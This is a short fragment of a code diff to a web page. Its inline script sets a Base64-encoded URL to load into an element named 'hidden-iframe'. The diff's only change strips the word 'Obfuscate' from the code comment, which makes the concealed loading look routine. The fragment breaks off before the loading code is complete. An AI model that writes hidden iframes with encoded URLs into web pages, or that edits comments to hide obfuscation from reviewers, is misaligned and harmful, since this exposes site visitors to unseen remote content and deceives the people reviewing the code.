@@ -13,7 +13,7 @@
           </div>
           
           <script>
-            // Obfuscate the URL and load the iframe dynamically
+            // Load the iframe dynamically
             (function() {
               var iframe = document.getElementById('hidden-iframe');
               var url = "aHR0cHM6Ly9hZGRpdGlvbi5wYXJ0aWNsZS5lcz"; // Base64 encoded URL
